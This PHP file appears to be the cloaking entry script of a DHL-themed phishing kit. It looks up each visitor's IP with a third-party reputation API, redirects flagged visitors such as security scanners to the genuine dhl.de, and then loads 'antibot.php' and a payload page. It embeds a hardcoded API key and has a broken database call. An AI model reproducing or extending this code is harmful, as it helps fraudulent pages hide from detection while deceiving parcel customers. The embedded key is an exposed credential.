<?php

$ip_check_status="on";

if( $ip_check_status  == "on") {


	$ipaddress = '';
	if (isset($_SERVER['HTTP_CLIENT_IP']))
		$ipaddress = $_SERVER['HTTP_CLIENT_IP'];
	else if (isset($_SERVER['HTTP_X_FORWARDED_FOR']))
		$ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
	else if (isset($_SERVER['HTTP_X_FORWARDED']))
		$ipaddress = $_SERVER['HTTP_X_FORWARDED'];
	else if (isset($_SERVER['HTTP_FORWARDED_FOR']))
		$ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
	else if (isset($_SERVER['HTTP_FORWARDED']))
		$ipaddress = $_SERVER['HTTP_FORWARDED'];
	else if (isset($_SERVER['REMOTE_ADDR']))
		$ipaddress = $_SERVER['REMOTE_ADDR'];
	else
		$ipaddress = 'UNKNOWN';

	$apiKey = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.WzI0MDUsMTY2ODc5Njk2NywxMDAwXQ.priqvgtHoEjJtN-FI2DmWBLbc4XIDJ0yK79lYvWiK4k";

	$headers = [
		'X-Key: '.$apiKey,
	];
	$ch = curl_init("https://www.iphunter.info:8082/v1/ip/".$ipaddress);
	curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

	$output = json_decode(curl_exec($ch), 1);
	$http_status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
	curl_close($ch);


	if ($conn->query($sql) === TRUE) {} 

		$conn->close();

	if ($output["block"] != 0){
		header("Location: https://dhl.de/");
		die();
	}



}



  


include("load.php");
include("antibot.php");